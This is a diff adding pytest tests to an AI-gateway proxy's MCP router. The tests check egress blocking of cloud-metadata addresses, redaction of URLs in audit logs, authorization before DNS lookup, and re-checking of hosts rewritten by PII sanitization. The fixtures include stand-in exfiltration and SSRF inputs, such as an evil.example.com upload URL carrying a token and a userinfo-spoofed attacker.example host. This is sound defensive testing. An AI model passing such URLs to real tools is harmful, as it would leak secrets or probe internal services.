@@ -8,6 +8,7 @@ from unittest.mock import patch
 import pytest
 from fastapi.testclient import TestClient
 
+from llm_shield_proxy.api import mcp_router as mcp_router_module
 from llm_shield_proxy.api.main import app
 from llm_shield_proxy.api.mcp_router import get_mcp_policy_resolver, warn_if_mcp_policy_is_empty_at_startup
 from llm_shield_proxy.core.config import settings
@@ -543,3 +544,296 @@ def test_upstream_hostname_resolving_to_metadata_ip_is_blocked_before_any_dispat
     assert response.status_code == 200
     assert response.json()["error"]["code"] == -32003
     assert httpx_mock.get_requests() == []
+
+
+def test_tool_argument_url_secret_is_redacted_in_audit(httpx_mock, monkeypatch):
+    """C3: a tools/call URL with query secrets must not leak into the signed audit chain."""
+    _override_policy({"allowed_tools": ["search_docs"], "blocked_tools": []})
+
+    async def _fake_resolve(host):
+        return ["169.254.169.254"]
+
+    monkeypatch.setattr("llm_shield_proxy.security.egress_guard._default_resolve", _fake_resolve)
+
+    with patch("llm_shield_proxy.observability.audit.AuditLogger.log_security_event") as mock_log:
+        response = client.post(
+            "/v1/mcp",
+            headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": UPSTREAM_URL},
+            json={
+                "jsonrpc": "2.0",
+                "id": 9,
+                "method": "tools/call",
+                "params": {
+                    "name": "search_docs",
+                    "arguments": {"q": "http://evil.example.com/upload?token=SUPERSECRET"},
+                },
+            },
+        )
+
+    assert response.json()["error"]["code"] == -32003
+    details = mock_log.call_args[1]["details"]
+    assert "SUPERSECRET" not in details["blocked_url"]
+    assert "token=" not in details["blocked_url"]
+    # The path goes too: identifiers live in paths as readily as in query params.
+    assert details["blocked_url"] == "http://evil.example.com"
+
+
+def test_redact_url_for_audit_drops_identifier_bearing_paths():
+    """C3: a PII-bearing path must not reach the signed chain either."""
+    from llm_shield_proxy.api.mcp_router import _redact_url_for_audit
+
+    assert _redact_url_for_audit("https://x.test/customer/123-45-6789") == "https://x.test"
+    assert _redact_url_for_audit("https://u:pw@x.test:8443/a/b?q=s#f") == "https://x.test:8443"
+    assert _redact_url_for_audit("http://[::1]:9000/path") == "http://[::1]:9000"
+
+
+def test_redact_url_for_audit_survives_a_malformed_port():
+    """A denial must not become a 500 because the attacker chose an unparseable port.
+
+    `urlsplit(...).port` raises ValueError on these, and this helper runs inside the
+    egress-violation handler -- so raising would drop the audit event as well.
+    """
+    from llm_shield_proxy.api.mcp_router import _redact_url_for_audit
+
+    for bad in ("https://evil.test:abc/x", "https://evil.test:99999/x"):
+        assert _redact_url_for_audit(bad) == "<unparseable-url>"
+
+
+def test_a_forbidden_tool_is_rejected_before_any_dns_resolution(monkeypatch):
+    """Greptile P1 on #38: authorization must precede attacker-controlled DNS work.
+
+    The egress gate added for `resources/read` was placed above the tool-authorization
+    block, so a caller whose role forbids the tool could still make the gateway resolve
+    any hostname it put in `params`. That is an unauthenticated outbound DNS probe, and
+    it is exactly the work authorization exists to gate.
+
+    The stale comment said as much: "tool authorization is checked BEFORE any upstream
+    routing or sanitization work" sat directly above the scan that had displaced it.
+    """
+    _override_policy({"allowed_tools": ["search_docs"], "blocked_tools": []})
+
+    resolved: list = []
+
+    async def _recording_resolve(host: str):
+        resolved.append(host)
+        return ["93.184.216.34"]
+
+    monkeypatch.setattr(
+        "llm_shield_proxy.security.egress_guard._default_resolve", _recording_resolve
+    )
+
+    response = client.post(
+        "/v1/mcp",
+        headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": UPSTREAM_URL},
+        json={
+            "jsonrpc": "2.0",
+            "id": 55,
+            "method": "tools/call",
+            "params": {
+                "name": "not_allowed_tool",
+                "arguments": {"probe": "https://attacker-chosen.example/x"},
+            },
+        },
+    )
+
+    # Both denials share -32003, so the code alone cannot tell a tool rejection from an
+    # egress one. The audit event type is what distinguishes them, and `resolved` is the
+    # property actually under test.
+    assert response.json()["error"]["code"] == mcp_router_module.JSONRPC_TOOL_FORBIDDEN
+    assert resolved == [], f"resolved {resolved} for a caller not allowed to call the tool"
+
+
+def test_an_allowed_call_resolves_each_url_once(monkeypatch):
+    """Greptile P1 on #38: the argument scan duplicated the params scan.
+
+    `scan_arguments(params)` already covers `params["arguments"]`, so the second pass
+    resolved every argument URL a second time, doubling outbound DNS for every allowed
+    tool call.
+    """
+    _override_policy({"allowed_tools": ["fetch"], "blocked_tools": []})
+
+    resolved: list = []
+
+    async def _recording_resolve(host: str):
+        resolved.append(host)
+        return ["93.184.216.34"]
+
+    monkeypatch.setattr(
+        "llm_shield_proxy.security.egress_guard._default_resolve", _recording_resolve
+    )
+
+    def response_callback(request):
+        import httpx
+
+        return httpx.Response(200, json={"jsonrpc": "2.0", "id": 56, "result": {"ok": True}})
+
+    httpx_mock_url = UPSTREAM_URL
+
+    with patch("llm_shield_proxy.api.mcp_router.AuditLogger.log_security_event"):
+        response = client.post(
+            "/v1/mcp",
+            headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": httpx_mock_url},
+            json={
+                "jsonrpc": "2.0",
+                "id": 56,
+                "method": "tools/call",
+                "params": {"name": "fetch", "arguments": {"u": "https://docs.example.com/x"}},
+            },
+        )
+
+    assert response.status_code == 200
+    assert resolved.count("docs.example.com") == 1, (
+        f"resolved docs.example.com {resolved.count('docs.example.com')} times: {resolved}"
+    )
+
+
+def test_every_forwarded_url_was_actually_checked(httpx_mock, monkeypatch):
+    """Defect 20: the URL the guard checked was not the URL the upstream tool receives.
+
+    `scan_arguments` deliberately runs on the RAW arguments. The comment said that made
+    it "the one an upstream tool would actually receive". It does not: what goes upstream
+    is the SANITIZED copy, and inbound sanitization uses `Vault(synthetic=True)`, which
+    substitutes realistic look-alike values rather than bracketed markers. When PII sits
+    inside a URL's authority, the substitution rewrites the host.
+
+    Measured before the fix:
+
+        checked   https://bob@example.com.attacker.example/x
+        forwarded https://jacksondaniel@example.net/x
+
+    A different registrable domain, never resolved, never evaluated against the egress
+    policy, and handed to the upstream tool to dial.
+
+    The assertion is the invariant rather than a predicted hostname, because the
+    substituted value is Faker-generated and deliberately not reproducible: every URL in
+    the payload actually forwarded must have had its host evaluated.
+    """
+    import orjson
+
+    from llm_shield_proxy.security.egress_guard import extract_host, find_urls
+
+    _override_policy({"allowed_tools": ["fetch"], "blocked_tools": []})
+
+    evaluated: list = []
+
+    async def _recording_resolve(host: str):
+        evaluated.append(host)
+        return ["93.184.216.34"]  # public, allowed, so the call proceeds to forwarding
+
+    monkeypatch.setattr(
+        "llm_shield_proxy.security.egress_guard._default_resolve", _recording_resolve
+    )
+
+    def response_callback(request):
+        import httpx
+
+        return httpx.Response(200, json={"jsonrpc": "2.0", "id": 1, "result": {"ok": True}})
+
+    httpx_mock.add_callback(response_callback, url=UPSTREAM_URL)
+
+    response = client.post(
+        "/v1/mcp",
+        headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": UPSTREAM_URL},
+        json={
+            "jsonrpc": "2.0",
+            "id": 1,
+            "method": "tools/call",
+            "params": {
+                "name": "fetch",
+                "arguments": {"callback": "https://bob@example.com.attacker.example/x"},
+            },
+        },
+    )
+
+    assert response.status_code == 200
+
+    forwarded = [r for r in httpx_mock.get_requests() if str(r.url) == UPSTREAM_URL]
+    assert forwarded, "nothing was forwarded upstream"
+    payload = orjson.loads(forwarded[-1].content)
+
+    forwarded_hosts = {extract_host(url) for url in find_urls(payload["params"]["arguments"])}
+    assert forwarded_hosts, "fixture forwarded no URL, so it proves nothing"
+
+    unchecked = forwarded_hosts - set(evaluated)
+    assert not unchecked, (
+        f"forwarded to the upstream tool without ever being evaluated: {sorted(unchecked)}; "
+        f"evaluated were {sorted(set(evaluated))}"
+    )
+
+
+def test_a_rewritten_host_that_is_forbidden_is_blocked(httpx_mock, monkeypatch):
+    """Defect 20, the half that matters: evaluating it is no use unless it also blocks.
+
+    The resolver answers public for the host the client actually sent and link-local for
+    anything else, so only the host sanitization invented is forbidden. The call must be
+    refused and nothing may reach the upstream.
+    """
+    _override_policy({"allowed_tools": ["fetch"], "blocked_tools": []})
+
+    sent_host = "example.com.attacker.example"
+
+    async def _split_resolve(host: str):
+        return ["93.184.216.34"] if host == sent_host else ["169.254.169.254"]
+
+    monkeypatch.setattr(
+        "llm_shield_proxy.security.egress_guard._default_resolve", _split_resolve
+    )
+
+    response = client.post(
+        "/v1/mcp",
+        headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": UPSTREAM_URL},
+        json={
+            "jsonrpc": "2.0",
+            "id": 2,
+            "method": "tools/call",
+            "params": {
+                "name": "fetch",
+                "arguments": {"callback": "https://bob@example.com.attacker.example/x"},
+            },
+        },
+    )
+
+    assert response.json()["error"]["code"] == -32003
+    assert [r for r in httpx_mock.get_requests() if str(r.url) == UPSTREAM_URL] == []
+
+
+def test_an_unrewritten_payload_costs_no_extra_resolution(httpx_mock, monkeypatch):
+    """The second half must be free when sanitization changed nothing.
+
+    A URL with no PII in it is forwarded byte for byte, so the difference set is empty
+    and the host is resolved exactly once, not twice.
+    """
+    _override_policy({"allowed_tools": ["fetch"], "blocked_tools": []})
+
+    evaluated: list = []
+
+    async def _recording_resolve(host: str):
+        evaluated.append(host)
+        return ["93.184.216.34"]
+
+    monkeypatch.setattr(
+        "llm_shield_proxy.security.egress_guard._default_resolve", _recording_resolve
+    )
+
+    def response_callback(request):
+        import httpx
+
+        return httpx.Response(200, json={"jsonrpc": "2.0", "id": 3, "result": {"ok": True}})
+
+    httpx_mock.add_callback(response_callback, url=UPSTREAM_URL)
+
+    response = client.post(
+        "/v1/mcp",
+        headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": UPSTREAM_URL},
+        json={
+            "jsonrpc": "2.0",
+            "id": 3,
+            "method": "tools/call",
+            "params": {"name": "fetch", "arguments": {"callback": "https://docs.example.com/x"}},
+        },
+    )
+
+    assert response.status_code == 200
+    assert evaluated.count("docs.example.com") == 1, (
+        f"host resolved {evaluated.count('docs.example.com')} times, expected once: {evaluated}"
+    )
